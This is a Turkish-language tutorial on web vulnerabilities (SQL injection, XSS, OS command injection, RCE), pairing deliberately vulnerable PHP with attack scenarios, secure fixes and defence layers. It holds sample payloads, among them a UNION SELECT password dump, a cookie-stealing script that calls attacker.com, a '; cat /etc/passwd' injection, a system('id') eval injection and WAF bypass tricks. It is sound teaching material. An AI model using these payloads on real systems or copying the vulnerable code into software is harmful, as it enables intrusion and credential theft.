# Web Uygulama ve Enjeksiyon Saldırıları
 
## 1. SQL Injection (SQLi)
Uygulamanın kullanıcıdan aldığı girdileri güvenli bir süzgeçten geçirmeden veya parametreleştirmeden, arka planda çalışan dinamik SQL sorgusunun içerisine string birleştirme (*concatenation*) yöntemiyle doğrudan eklemesi sonucu oluşan zafiyete **SQL Injection** denir.

Saldırgan, girdi alanlarına kendi kötü niyetli SQL komutlarını enjekte ederek veri tabanının mantıksal akışını değiştirir. Sonuçta veri tabanı, bu girdiyi bir veri olarak değil, çalıştırılması gereken bir SQL emri olarak algılar.

---

### SQLi Türleri ve Teknik Anatomisi
Saldırganlar veriyi sızdırırken veri tabanının verdiği tepkilere göre üç ana kanalı kullanırlar:

#### A) In-band SQLi (Klasik / Aynı Kanal Üzerinden)
Saldırganın zararlı kodu gönderdiği HTTP isteği (*Request*) ile veri tabanından sızan yanıtı aldığı HTTP cevabının (*Response*) aynı kanal üzerinden gerçekleştiği türdür. Sömürülmesi en kolay zafiyet türüdür.

*   **Error-based (Hata Tabanlı):** Saldırgan, girdi alanına kasıtlı olarak tırnak (`'`), çift tırnak (`"`) veya SQL sözdizimini bozacak karakterler girerek veri tabanının hata üretmesini sağlar. Hata yönetiminin düzgün yapılmaması veya sistem hata mesajlarının canlı ortamda doğrudan kullanıcıya dönülmesi bu zafiyete zemin hazırlar. Ekrana dönen hata mesajından veri tabanının türü, tablo isimleri ve kolon yapıları sızdırılabilir.
*   **UNION-based:** Saldırgan, orijinal sorgunun sonuna `UNION SELECT` ifadesi ekleyerek veri tabanındaki tamamen farklı tablolardan veri çeker ve bunları uygulamanın normalde veri listelediği alana yazdırır. UNION işleminin çalışabilmesi için orijinal sorgudaki kolon sayısı ile saldırganın eklediği kolon sayısının ve veri tiplerinin eşleşmesi gerekir. Normalde ekranda sadece ürün adı listelenecekken, saldırgan bu yöntemle kullanıcı şifrelerini aynı listenin içine gömebilir.

#### B) Inferential / Blind SQLi (Çıkarımsal / Kör)
Uygulama dış dünyaya hiçbir SQL hatası göstermediğinde ve ekrana veri tabanından hiçbir veri yansıtmadığında bu durum yaşanır. Uygulama tamamen dilsizdir; ancak saldırgan, sisteme mantıksal sorular sorarak aldığı dolaylı tepkilerden çıkarım yapar.

*   **Boolean-based (Mantıksal Kör):** Saldırgan sorguya `AND 1=1` (Doğru) veya `AND 1=2` (Yanlış) gibi ifadeler enjekte eder. `AND 1=1` dendiğinde sayfa sorunsuz yükleniyor, `AND 1=2` dendiğinde ise sayfa boş dönüyor veya hata veriyorsa, uygulama saldırgana mantıksal bir çıktı sağlıyor demektir. Saldırgan harf harf sorgulama yaparak veri tabanı adını veya verileri otomatize araçlarla tamamen indirebilir.
*   **Time-based (Zaman Tabanlı Kör):** Uygulama True veya False durumlarında tamamen aynı sayfayı döndüğünde, tasarımsal veya içeriksel hiçbir fark oluşmuyorsa, saldırgan veri tabanını geciktirme komutları (`SLEEP`, `WAITFOR DELAY`) ile test eder. Belirtilen koşul doğruysa sunucunun yanıtı geç dönmesi sağlanır ve HTTP yanıtının gelme süresi ölçülerek veri çözümlenir.

#### C) Out-of-Band (OOB) SQLi (Farklı Kanal Üzerinden)
İçerideki ağ yapısı veya veri tabanı konfigürasyonu yüzünden In-band veya Blind SQLi yöntemlerinin çalışmadığı durumlarda kullanılır. Saldırgan, veri tabanına enjekte ettiği kodla, veri tabanının dış dünyadaki bir sunucuya HTTP veya DNS isteği atmasını sağlar. Veri tabanı, sızdırılmak istenen veriyi bir DNS sorgusuna ekleyerek dışarıya fırlatır ve saldırgan kendi sunucu loglarında bu veriyi okur.

---

### Kod Örnekleri
#### Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki satırlarda, kullanıcıdan gelen veri hiçbir filtreden veya kontrolden geçirilmeden doğrudan SQL sorgusunun içerisine yerleştirilmektedir:
```php
<?php
// Girdi hiçbir filtreden geçmeden doğrudan alınıyor
$userId = $_GET['id']; 

// String birleştirme (Concatenation) ile güvensiz sorgu oluşturuluyor
$query = "SELECT username, email FROM users WHERE id = '" . $userId . "'";

$result = mysqli_query($conn, $query);
$row = mysqli_fetch_assoc($result);
echo "Kullanıcı: " . $row['username'];
?>
```
#### Saldırı Senaryosu
Saldırgan URL'deki `id` parametresine `1' UNION SELECT username, password FROM users --` ifadesini girdiğinde, arka planda çalışan nihai SQL sorgusu şu şekle bürünür:

```sql
SELECT username, email FROM users WHERE id = '1' UNION SELECT username, password FROM users -- '
```
SQL dilinde çift tire işareti (`--`) yorum satırı anlamına geldiğinden, sorgunun geri kalan orijinal tırnağı iptal edilir. Uygulama, ekrana normal kullanıcının bilgileri yerine `users` tablosundaki tüm şifreleri basmaya başlar.

---

### Doğru ve Güvenli Kod (Secure Code)
SQL Injection saldırılarını önlemenin en kesin yolu **Parametreli Sorgular** (*Parameterized Queries / Prepared Statements*) kullanmaktır. Bu yöntemde SQL motoru, sorgu şablonunu önceden derler; kullanıcıdan gelen girdi sorguya dahil edildiğinde asla bir komut olarak çalıştırılamaz, sadece saf bir veri olarak işlem görür.
```php
<?php
$userId =$_GET['id'];

$stmt =$conn->prepare("SELECT username, email FROM users WHERE id = ?");
$stmt->bind_param("i", $userId);

$stmt->execute();
$result =$stmt->get_result();
$row =$result->fetch_assoc();

echo "Kullanıcı: " . $row['username'];
?>
```
## Savunma Katmanları (Defense-in-Depth)
Güvenliği tek bir noktaya bağlamamak ve derinlemesine savunma stratejisi oluşturmak adına şu katmanların uygulanması gerekir:

### 1. Stored Procedures (Saklı Yordamlar)
Sorgular uygulama kodunda değil, veri tabanı üzerinde önceden derlenmiş fonksiyonlar olarak tutulur. Ancak Stored Procedure'ün kendi içinde dinamik string birleştirme yapılıyorsa, SQLi zafiyeti prosedür içinde de aynen devam eder. Parametrik yapı prosedür içinde de korunmalıdır.

### 2. Input Validation (Girdi Doğrulama - Whitelisting)
Sisteme giren verinin beklenen tip, uzunluk ve formatta olduğunun kontrol edilmesidir. Bir ID parametresi alınıyorsa sadece sayı olduğundan emin olunmalı, beklenmeyen karakterler içeren girdiler daha sorguya ulaşmadan reddedilmelidir.

### 3. Hata Mesajlarını Gizlemek (Error Hiding & Logging)
Canlı ortamdaki uygulamalarda detaylı hata gösterimi kapatılmalıdır. Hata mesajları kullanıcıya gösterilmemeli, arka planda güvenli bir log dosyasına yazılmalıdır. Kullanıcıya ise sadece jenerik bir hata mesajı verilmelidir. Bu işlem, hata tabanlı saldırıları büyük ölçüde zorlaştırır.

### 4. En Az Yetki İlkesi (Principle of Least Privilege)
Web uygulamasının veri tabanına bağlanırken kullandığı kullanıcının yetkileri kısıtlı olmalıdır. Sadece veri okuyan bir uygulamanın veri tabanı kullanıcısına tablo silme (`DROP`) veya sisteme dosya yazma yetkileri verilmemelidir.

### 5. WAF (Web Application Firewall)
Uygulama katmanındaki trafiği inceleyen akıllı bir kalkan gibidir. Gelen HTTP isteklerinde `OR 1=1`, `UNION SELECT`, `concat()` gibi bilinen siber saldırı imzalarını (*signature*) arar ve yakalarsa isteği drop eder (keser).

> ⚠️ **Kritik Not:** WAF yazılımcının hatasını kapatan geçici bir yamadır. Saldırganlar **WAF Bypass** teknikleri (örneğin büyük/küçük harf kombinasyonları `UnIoN SeLeCt`, URL encoding `%2527`, inline yorum satırları `UNI//ON`) kullanarak bu korumayı aşabilirler. Asıl çözüm her zaman kod seviyesindedir.
------
## 2. Cross-Site Scripting (XSS)
Uygulamanın kullanıcıdan aldığı güvenilmeyen girdileri yeterli doğrulama, temizleme veya kodlama işlemlerinden geçirmeden tarayıcıya göndermesi sonucu oluşan zafiyete **Cross-Site Scripting (Siteler Arası Betik Çalıştırma)** denir.

SQL Injection zafiyetinde hedef arka plandaki veri tabanı sunucusuyken, XSS zafiyetinde hedef doğrudan uygulamayı kullanan kurbanın tarayıcısıdır. Saldırgan, web uygulamasına kötü niyetli JavaScript kodları enjekte ederek tarayıcının bu kodları sitenin kendi orijinal betiğiymiş gibi çalıştırmasını sağlar. Bu durum, oturum çerezlerinin sızdırılmasına, hesapların ele geçirilmesine, sayfa içeriğinin manipüle edilmesine (*deface*) veya kullanıcının sahte kimlik doğrulama formlarıyla dolandırılmasına (*phishing*) yol açar.

---

### XSS Türleri ve Teknik Anatomisi
XSS saldırıları, zararlı kodun saklanma yerine ve tarayıcıya ulaşma biçimine göre üç ana başlıkta incelenir:

#### A) Stored / Persistent XSS (Kalıcı XSS)
Zararlı JavaScript kodunun uygulamanın veri saklama katmanına (veri tabanı, dosya sistemi, forum başlıkları, yorum alanları veya profil bilgileri) kalıcı olarak kaydedildiği ve sömürü potansiyeli en yüksek olan XSS türüdür.

*   **Çalışma Mekanizması:** Girdilerin filtrelenmediği bir e-ticaret platformunun ürün yorumları kısmına bir saldırganın zararlı bir kod bloğu bıraktığı senaryoda, bu girdi doğrudan veri tabanına yazılır. İlgili ürün sayfasını ziyaret eden her kullanıcının tarayıcısı, veri tabanından gelen bu yorumu okur. Tarayıcı, gelen metni bir HTML bileşeni olarak işlerken içerisindeki `<script>` etiketini fark eder ve arka planda görünmez bir şekilde çalıştırır. Tek bir enjeksiyon ile sayfayı ziyaret eden binlerce kullanıcının oturum bilgileri tehlikeye atılabilir.

#### B) Reflected XSS (Yansıtılan / Kalıcı Olmayan XSS)
Zararlı kodun veri tabanına kaydedilmediği, bunun yerine saldırgan tarafından hazırlanan kötü niyetli isteğin (genellikle HTTP GET parametreleri veya form verileri) sunucu tarafından doğrudan istemciye geri yansıtıldığı XSS türüdür.

*   **Çalışma Mekanizması:** Bir web sitesinin arama motoru optimizasyonunda, aranan kelimenin ekranda listelendiği varsayıldığında, sunucu gelen parametreyi olduğu gibi HTML içerisine yerleştirir. Saldırgan, arama parametresinin içerisine JavaScript kodu yerleştirerek özel bir bağlantı adresi oluşturur. Bu saldırının başarıya ulaşması için kurbanın, sosyal mühendislik yöntemleriyle bu bağlantıya tıklatılması gerekir. Kurban bağlantıya tıkladığında, istek sunucuya gider; sunucu girdiyi kontrol etmeden arama sonucu sayfasına aynen yansıtır ve kurbanın tarayıcısı kodu yürütür.

#### C) DOM-based XSS (DOM Tabanlı XSS)
Zararlı kodun sunucu tarafına hiç uğramadığı, tamamen istemci tarafında (*Client-side*) ve tarayıcının Belge Nesnesi Modelini (DOM) güvensiz bir şekilde işlemesiyle meydana gelen XSS türüdür.

*   **Çalışma Mekanizması:** Sayfada yer alan yerel bir JavaScript kodu, URL adresindeki parametreleri veya hash (diyez) işaretinden sonraki değerleri okuyup doğrudan sayfa bileşenlerine yazıyor olabilir. Sunucu, URL'deki hash sonrasındaki verileri HTTP isteğiyle almadığı için geleneksel Web Uygulama Güvenlik Duvarları (WAF) bu saldırıyı tespit edemez. Tarayıcı, yerel script dosyalarını çalıştırırken güvensiz kaynaktan aldığı veriyi HTML yapısına dahil eder ve saldırganın kodu istemci tarafında *execution* (yürütme) aşamasına geçer.

---

### Kod Örnekleri

#### Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki satırlarda, URL parametresinden alınan veri hiçbir kontrol veya kodlama işlemine tabi tutulmadan doğrudan HTML çıktısının içerisine yerleştirilmektedir:

```php
<?php
// Kullanıcı girdisi url parametresinden doğrudan alınıyor
$searchQuery =$_GET['search'];

// Alınan veri ham haliyle HTML içerisine yazdırılıyor
echo "<div> Arama sonuçları: " . $searchQuery . "</div>";
?>
```
#### Saldırı Senaryosu
Saldırgan, kurbana şu bağlantı adresini gönderir: 
`http://example.com/index.php?search=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>`

Kurban bu bağlantıyı açtığında, sunucu tarafında üretilen nihai HTML çıktısı şu şekle bürünür:

```html
<div> Arama sonuçları: <script>document.location='[http://attacker.com/steal.php?cookie='+document.cookie](http://attacker.com/steal.php?cookie='+document.cookie)</script></div>
```
```php
<?php
// Kullanıcı girdisi alınıyor
$searchQuery =$_GET['search'];

// htmlspecialchars fonksiyonu ile tehlikeli karakterler dönüştürülüyor
// ENT_QUOTES parametresi hem tek hem çift tırnakların kodlanmasını sağlar
$secureQuery = htmlspecialchars($searchQuery, ENT_QUOTES, 'UTF-8');

echo "<div> Arama sonuçları: " . $secureQuery . "</div>";
?>
```
##### Dönüşüm Tablosu:

| Orijinal Karakter | HTML Karşılığı (Encoded) |
| :---: | :---: |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#039;` |
| `&` | `&amp;` |

Yukarıdaki kodlama yapıldığında tarayıcı, `<script>` ifadesini çalıştırılacak bir komut dizisi olarak değil, ekranda gösterilmesi gereken düz bir metin olarak algılar. Eğer girdi bir JavaScript bloğunun değişkenine atanacaksa *JavaScript Encoding*, bir URL özniteliğine (`href`) yazılacaksa *URL Encoding* kuralları uygulanmalıdır. Modern framework yapıları (React, Angular, Vue) mimarileri gereği bu temizliği çıktı aşamasında otomatik olarak gerçekleştirmektedir.

---

### Savunma Katmanları (Defense-in-Depth)
Çıktı kodlamasının yanı sıra, sistem güvenliğini pekiştirmek amacıyla derinlemesine savunma ilkeleri doğrultusunda şu mekanizmalar kurulmalıdır:

#### 1. HTTPOnly Çerez Tanımlamaları
XSS sömürülerinin birincil amacı oturum belirteçlerini çalmaktır. Oturum çerezleri (*Session Cookies*) sunucu tarafında oluşturulurken `HttpOnly` bayrağı ile işaretlenmelidir. Bu bayrak aktif edildiğinde, tarayıcı üzerindeki hiçbir JavaScript kodu (`document.cookie`) ile bu çereze erişemez. Uygulamada bir XSS açığı meydana gelse dahi, saldırgan kullanıcının aktif oturum çerezini dışarıya sızdıramaz.

#### 2. Content Security Policy (CSP - İçerik Güvenlik Politikası)
Web sunucusu tarafından HTTP yanıt başlığı (*Header*) olarak tarayıcıya gönderilen bir güvenlik talimatıdır. CSP, tarayıcının hangi kaynaklardan script, stil veya resim yükleyebileceğini kesin kurallarla belirler.

Örnek bir CSP başlığı:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' [https://trustedscripts.com](https://trustedscripts.com);
```
---
---

## 3. Command Injection (OS Command Injection)
Uygulamanın kullanıcıdan aldığı verileri, sistem kabuğuna (*shell*) aktarılan bir komut dizisi içerisine güvenli bir süzgeçten geçirmeden dahil etmesi sonucu oluşan zafiyete **Command Injection (İşletim Sistemi Komut Enjeksiyonu)** denir.

Bu zafiyet türünde saldırgan, web uygulamasının çalıştığı sunucunun işletim sistemi üzerinde doğrudan komut çalıştırma yetkisi elde eder. Saldırgan; sistem dosyalarını okuyabilir, sunucu üzerindeki verileri silebilir veya sunucudan kendi bilgisayarına doğru tersine bir bağlantı (*reverse shell*) başlatarak terminal kontrolünü tamamen ele geçirebilir.

---

### Komut Ayırıcılar ve Teknik Anatomisi
İşletim sistemleri, birden fazla komutun aynı satırda ardışık veya mantıksal bir sıra ile çalıştırılabilmesi için komut ayırıcılara (*Command Separators*) sahiptir. Saldırganlar, girdi alanlarına bu karakterleri enjekte ederek uygulamanın asıl çalıştırmak istediği komutun dışına çıkarlar.

En sık kullanılan komut ayırıcılar şunlardır:
*   `;` **(Linux / Unix):** Önceki komutun durumuna bakılmaksızın ardışık komut çalıştırılmasını sağlar.
*   `&` **(Linux / Windows):** İlk komutu arka planda çalıştırırken, hemen yanındaki ikinci komutun da eş zamanlı yürütülmesini sağlar.
*   `&&` **(Linux / Windows):** Mantıksal VE anlamına gelir. İlk komut başarılı bir şekilde sonuçlanırsa (*exit code 0*), ikinci komut çalıştırılır.
*   `||` **(Linux / Windows):** Mantıksal VEYA anlamına gelir. İlk komut hata verir veya başarısız olursa, alternatif olarak ikinci komut çalıştırılır.
*   `|` **(Pipelining - Linux / Windows):** İlk komutun çıktısını (*stdout*), girdi (*stdin*) olarak ikinci komuta aktarır.

---

### Kod Örnekleri

#### Hatalı ve Savunmasız Kod (Vulnerable Code)
Aşağıdaki PHP örneğinde, sistem yöneticilerinin ağ kontrolü yapabilmesi amacıyla tasarlanmış bir ping aracı yer almaktadır. Yazılımcı, kullanıcıdan gelen IP adresini doğrudan sistem kabuğuna gönderen güvensiz bir fonksiyon kullanmıştır:
```php
<?php
// Kullanıcıdan gelen IP adresi doğrulanmadan alınıyor
$targetIp =$_POST['ip_address'];

// Girdi, string birleştirme ile doğrudan sistem komutunun içine gömülüyor
// Örn: ping -c 4 127.0.0.1
$command = "ping -c 4 " . $targetIp;

// Komut sistem kabuğunda (shell) güvensiz bir şekilde çalıştırılıyor
$output = shell_exec($command);

echo "<pre>" . $output . "</pre>";
?>
```
#### Saldırı Senaryosu
Saldırgan, `ip` parametresine sadece bir adres yazmak yerine komut ayırıcı kullanarak şu girdi değerini gönderir: `8.8.8.8 ; cat /etc/passwd`

Bu durumda arka planda sunucunun yürüttüğü nihai komut şu şekle bürünür:

```bash
ping -c 4 8.8.8.8 ; cat /etc/passwd
```
İşletim sistemi önce `8.8.8.8` adresine ping atar, ardından `;` ayırıcısını gördüğü için durmaksızın yanındaki `cat /etc/passwd` komutunu tetikler. Sonuç olarak sunucudaki tüm sistem kullanıcılarının listesi saldırganın ekranına yazdırılır.

---

### Doğru ve Güvenli Kod (Secure Code)
OS Command Injection zafiyetini önlemenin en kesin ve birincil yolu, harici işletim sistemi komutları çağırmaktan tamamen kaçınmaktır. Çoğu senaryoda sistem komutlarına başvurmak, programlama dilinin kendi yeteneklerini kullanmamaktan kaynaklanır.

#### Çözüm A: Programlama Dilinin Yerleşik Fonksiyonlarını (Built-in API) Kullanmak
Dosya silmek için `shell_exec("rm " . $file)` yazmak yerine dilin kendi çekirdek fonksiyonları tercih edilmelidir.
```php
<?php
// Güvensiz Yöntem: shell_exec("rm " . $fileName);
// Güvenli ve Doğru Yöntem: Dilin yerleşik dosya sistem API'sini kullanmak

$fileName =$_GET['file'];
$securePath = "/var/www/uploads/" . basename($fileName);

if (file_exists($securePath)) {
    unlink($securePath); // İşletim sistemi kabuğuna uğramadan doğrudan dosya silinir
    echo "Dosya başarıyla silindi.";
}
?>
```
##### Çözüm B: Bağımsız Argüman Dizisi ile Güvenli Çalıştırma (Arguments Passing)
Eğer sistemde harici bir yazılımın (örneğin video dönüştürmek için `ffmpeg` veya imaj işlemek için `imagemagick`) çalıştırılması mutlak bir zorunluluk ise, girdiler tek bir metin halinde kabuğa fırlatılmamalıdır. Bunun yerine, komut ve parametreleri birbirinden ayıran bir dizi (*array*) yapısı kullanılmalıdır.

Aşağıdaki Python örneğinde, `subprocess` modülü kabuk (*shell*) katmanını devre dışı bırakarak girdiyi yeni bir komut olarak değil, sadece bir argüman olarak işler:

```python
import subprocess

# Kullanıcıdan alınan girdi
user_input = "8.8.8.8 ; cat /etc/passwd"

# shell=False parametresi zorunlu kılınarak komut ve argümanlar dizi olarak verilir
# Bu mimaride noktalı virgül ve sonraki komutlar ping programına sadece "metin parametresi" olarak iletilir
result = subprocess.run(["ping", "-c", "4", user_input], shell=False, capture_output=True, text=True)

print(result.stdout)
```
Kabuk devre dışı bırakıldığı için, işletim sistemi `; cat /etc/passwd` kısmını yeni bir komut emri olarak yorumlayamaz ve ping programı bu girdi bütününü geçersiz bir IP adresi olarak nitelendirip hata verir.

---

### Savunma Katmanları (Defense-in-Depth)
Sistem mimarisini daha korunaklı hale getirmek adına uygulanması gereken derinlemesine savunma ilkeleri şunlardır:

#### 1. Sıkı Beyaz Liste Tabanlı Girdi Doğrulama (Strict Whitelisting)
Kullanıcıdan beklenen verinin formatı düzenli ifadeler (*Regex*) ile en başta çok sıkı bir kontrole tabi tutulmalıdır. Girdi, belirlenen kalıbın dışındaysa işlem sunucu tarafında anında sonlandırılmalıdır.

##### Örnek IP Doğrulama Yapısı (PHP):
```php
$targetIp =$_GET['ip'];

// IP adresi formatını kontrol eden kesin Regex kalıbı
if (!preg_match('/^([0-9]{1,3}\.){3}[0-9]{1,3}$/',$targetIp)) {
    die("Hatalı girdi formatı.");
}

// Doğrulama geçilirse işleme devam edilir
```
#### 2. İşletim Sistemi Seviyesinde Kaçış Karakterleri Kullanımı (Escaping)
Girdilerin bir dizi halinde harici programa aktarılamadığı eski mimarilerde, veriyi komut satırına göndermeden önce dile özgü kaçış fonksiyonlarından geçirmek zorunludur. Bu fonksiyonlar `;`, `&`, `|` gibi komut ayırıcıların önüne ters eğik çizgi (`\`) koyarak veya girdiyi tırnak içine alarak karakterlerin özel anlamlarını yitirmesini sağlar.

PHP içerisindeki güvenli uygulama şu şekildedir:
```php
$targetIp =$_GET['ip'];

// escapeshellarg fonksiyonu girdiyi tek tırnak içine alır ve içindeki tırnakları kaçırır
$secureIp = escapeshellarg($targetIp);

$output = shell_exec("ping -c 4 " . $secureIp);
```
#### 3. En Az Yetki İlkesi (Sunucu Seviyesinde Kısıtlama)
Web uygulamasını ve web sunucusunu (Apache, Nginx, IIS) çalıştıran işletim sistemi kullanıcısının yetkileri en alt düzeyde tutulmalıdır.

*   Linux sistemlerde web sunucusu genellikle `www-data` veya `apache` gibi sınırlı yetkilere sahip özel kullanıcılar adıyla çalıştırılır.
*   Bu kullanıcıların kesinlikle `root` (yönetici) yetkileri olmamalıdır.
*   Kullanıcı, sistemdeki kritik dizinlere yazma yetkisine sahip olmamalı ve `/etc/sudoers` dosyasında kesinlikle yer almamalıdır.

Bu kısıtlamalar sayesinde, uygulamada bir Command Injection açığı meydana gelse dahi, saldırganın sunucu işletim sistemi içerisindeki hareket alanı ve sisteme verebileceği zarar en alt düzeyde sınırlandırılmış olur.


# 4. Remote Code Execution (RCE)

Uygulamanın güvensiz girdi işleme, hatalı nesne serileştirme veya yetersiz dosya kontrolü gibi mimari açıklarından faydalanılarak, uzak bir ağ üzerindeki saldırganın hedef sunucuda veya cihazda herhangi bir programlama kodunu yürütmesine olanak tanıyan en kritik zafiyet türüne **Remote Code Execution (Uzaktan Kod Çalıştırma)** denir.

Siber güvenlik literatüründe sömürü potansiyeli en yüksek zafiyet olarak kabul edilir. Saldırgan, hedef sisteme fiziksel veya meşru bir erişim hakkı bulunmaksızın, uygulama katmanına gönderdiği özel isteklerle sunucu tarafında kullanılan programlama dilinin (PHP, Python, Java, C# vb.) yorumlayıcısını manipüle eder. RCE zafiyetinin sömürülmesi, saldırganın sistemde en üst düzey yetkilerle donatılmış bir yönetici gibi hareket etmesine, yani sistemin tamamen ele geçirilmesine (**Full Compromise**) yol açar.

---

## RCE ile OS Command Injection Arasındaki Kavramsal Farklar

Bu iki zafiyet türü, sunucuyu ele geçirme amacına hizmet ettiği için sıklıkla karıştırılmaktadır. Ancak aralarında net bir katman farkı bulunmaktadır:

*   **OS Command Injection:** Saldırganın girdisi, doğrudan işletim sisteminin komut satırı yorumlayıcısına (Linux'ta `sh`/`bash`, Windows'ta `cmd.exe`/`PowerShell`) aktarılır. Saldırgan yalnızca işletim sisteminin tanıdığı terminal komutlarını (`ping`, `cat`, `dir`, `whoami`) tetikleyebilir.
*   **Remote Code Execution (RCE):** Saldırganın girdisi, uygulamanın yazıldığı programlama dilinin çalışma zamanı (*Runtime*) motoruna veya kod yorumlayıcısına aktarılır. Saldırgan dilin kendi fonksiyonlarını, matematiksel kütüphanelerini veya nesne yönelimli yapılarını (`eval()`, `assert()`, `system()`) manipüle eder.

> 💡 **Not:** RCE elde eden bir saldırgan, programlama dilinin yeteneklerini kullanarak sistem üzerinde bir alt süreç (*subprocess*) başlatabilir ve işletim sistemi komutlarını da çağırabilir. Dolayısıyla RCE, Command Injection zafiyetini de içerisine alabilen çok daha geniş ve üst seviye bir çatı terimdir.

---

## RCE Oluşum Senaryoları ve Teknik Anatomisi

Uygulama mimarilerinde RCE zafiyetine sebebiyet veren üç temel senaryo bulunmaktadır:

### A) Tehlikeli Fonksiyonların Kullanımı (Dinamik Kod Değerlendirme)
Yazılımcıların, kullanıcıdan gelen dinamik verileri veya parametreleri, programlama dilinde string ifadeleri birer kod bileşeni gibi çalıştıran fonksiyonlara doğrudan aktarmasıyla oluşur. Dil yorumlayıcıları bu girdiyi bir metin olarak değil, derlenmesi ve yürütülmesi gereken bir yazılım talimatı olarak işler.

### B) Güvensiz Nesne Serileştirme (Insecure Deserialization)
Veriler, ağ üzerinden taşınmak veya veri tabanlarında saklanmak amacıyla yapılandırılmış bir metin ya da byte dizisine dönüştürülür (*Serialization*). Bu verinin tekrar belleğe alınarak nesneye dönüştürülmesi (*Deserialization*) esnasında, eğer gelen veri doğrulanmazsa saldırgan serileştirilmiş verinin içerisine kötü niyetli nesne sınıfları enjekte edebilir. Nesne belleğe yüklenip kurucu (`__construct`) veya yıkıcı (`__destruct`) metotları tetiklendiğinde zararlı kodlar arka planda yürütülür.

### C) Sınırsız Dosya Yükleme Açıkları (Unrestricted File Upload)
Kullanıcıların profil resmi, doküman veya fatura yüklemesi için tasarlanan alanlarda, sunucu tarafında uzantı ve içerik doğrulamalarının yetersiz yapılması durumunda ortaya çıkar. Saldırgan sistemin izin verdiği görsel uzantıları yerine sunucu tarafında çalışan dilin uzantısına sahip (`.php`, `.jsp`, `.asp`, `.py`) bir arka kapı kodu (*Web Shell*) yükler. Ardından bu dosyanın sunucudaki doğrudan URL adresine tarayıcı üzerinden istek atarak kodun sunucu tarafında derlenmesini sağlar.

---

## Kod Örnekleri

### Hatalı ve Savunmasız Kod (Vulnerable Code)

Aşağıdaki PHP örneğinde, web uygulamasının modüllerini veya fonksiyonlarını URL üzerinden gelen parametreye göre dinamik olarak çalıştırmak isteyen güvensiz bir yapı yer almaktadır:

```php

<?php
// Kullanıcıdan dinamik olarak çalıştırılacak işlem parametresi alınıyor
$action =$_GET['action'];

// eval fonksiyonu içerisine yazılan string ifadeyi saf PHP kodu olarak çalıştırır
// Güvensiz girdi doğrudan fonksiyonun içerisine gömülmektedir
eval("\$result = " . $action . ";");

echo "İşlem sonucu başarıyla yürütüldü.";
?>
```
## Saldırı Senaryosu

Saldırgan, `action` parametresine sadece bir fonksiyon adı yazmak yerine, PHP dilinin satır sonu işaretini (noktalı virgül) kullanarak kendi kodunu enjekte eder: 
`phpinfo(); system('id')`

Bu durumda sunucu tarafında `eval()` fonksiyonunun içerisine düşen nihai string şu şekle bürünür:

```php
$result = phpinfo(); system('id');
```
Yorumlayıcı, ilk olarak sistem konfigürasyonunu döner, ardından hemen yanındaki `system('id')` fonksiyonunu tetikleyerek sunucunun işletim sistemindeki kullanıcı kimlik bilgilerini siber saldırganca yapılandırılan HTTP yanıtının içerisine gömer.

---

## Doğru ve Güvenli Kod (Secure Code)

RCE zafiyetine karşı en etkili koruma yöntemi, girdileri koda dönüştüren tehlikeli fonksiyonların (`eval()`, `exec()`, `passthru()`, `assert()`) kaynak kod mimarisinden tamamen kaldırılmasıdır. Dinamik bir yapı kurulması gerekiyorsa, bu işlem kullanıcıdan gelen ham metinlerle değil, katı bir **Beyaz Liste (Whitelist)** kontrol mekanizması ile gerçekleştirilmelidir.
```php
<?php
// Kullanıcıdan alınacak parametre kısıtlanıyor
$action =$_GET['action'];

// Sadece izin verilen fonksiyonların yer aldığı kesin bir beyaz liste oluşturulur
$allowedActions = [
    'get_profile' => 'displayProfile',
    'get_stats'   => 'displayStats',
    'get_logs'    => 'displayLogs'
];

// Kullanıcının girdisi beyaz listede aranır
if (array_key_exists($action,$allowedActions)) {
    // Girdi doğrudan koda gömülmez, listedeki güvenli fonksiyon eşleşmesi çağrılır
    $functionToCall =$allowedActions[$action];$functionToCall();
} else {
    // Tanımsız veya zararlı bir girdi geldiğinde işlem anında reddedilir
    die("Geçersiz işlem talebi.");
}
?>
```
## Savunma Katmanları (Defense-in-Depth)

RCE, doğrudan sunucu hakimiyetinin kaybedilmesi anlamına geldiği için savunma hattının tek bir kod bloğuna değil, derinlemesine güvenlik mimarisine dayandırılması zorunludur:

### 1. Dosya Yükleme Alanlarının İzolasyonu ve Güvenliği
Kullanıcıların sisteme dosya aktarabildiği alanlar, RCE saldırılarının birincil hedefidir. Bu alanları güvenli kılmak için şu adımlar uygulanmalıdır:
*   **İçerik Doğrulaması:** Yüklenen dosyaların kontrolü sadece dosya adı uzantısına (`.jpg`) bakılarak yapılmamalıdır. Dosyanın ilk byte değerlerini inceleyen MIME tipi (*Magic Bytes*) kontrolleri yapılarak dosyanın gerçek içeriği doğrulanmalıdır.
*   **İsimlendirme ve Yol Manipülasyonunun Önlenmesi:** Yüklenen dosyaların orijinal isimleri sistem tarafından korunmamalıdır. Dosyalar sunucuya kaydedilirken isimleri tahmin edilemeyecek rastgele karakter dizileriyle (UUID/GUID) değiştirilmelidir.
*   **Erişim Kısıtlaması ve Yürütme Yetkisinin Kaldırılması:** Yüklenen dosyalar, web uygulamasının kaynak kodlarının bulunduğu dizinlerin dışında, izole bir dosya sunucusunda veya bulut depolama alanında (*Object Storage*) tutulmalıdır. Dosyaların saklandığı dizinde web sunucusu seviyesinde "Script Execution" (Kod Yürütme) yetkisi tamamen kapatılmalıdır. Örneğin Apache sunucuları için ilgili dizindeki `.htaccess` dosyasında tüm script işleyicileri devre dışı bırakılmalıdır.

### 2. Bağımlılıkların Kontrolü ve Yazılım Bileşenleri Analizi (SCA)
*   RCE zafiyetleri, çoğunlukla yazılımcının kendi geliştirdiği kodlardan ziyade, projeye dahil edilen üçüncü parti kütüphanelerden, çerçevelerden (*framework*) veya loglama modüllerinden kaynaklanır.
*   Sistem genelinde düzenli olarak Yazılım Bileşenleri Analizi (*Software Composition Analysis - SCA*) araçları kullanılmalıdır.
*   Kullanılan bağımlılıklar (NuGet, npm, Maven, Composer paketleri) sürekli taranmalı, bilinen bir RCE açığı (CVE kayıtları) barındıran eski versiyonlar tespit edilerek kütüphaneler en güncel stabil sürümlerine yükseltilmelidir.

### 3. Uygulama Konteynerleştirme ve Sandbox Mimarisi
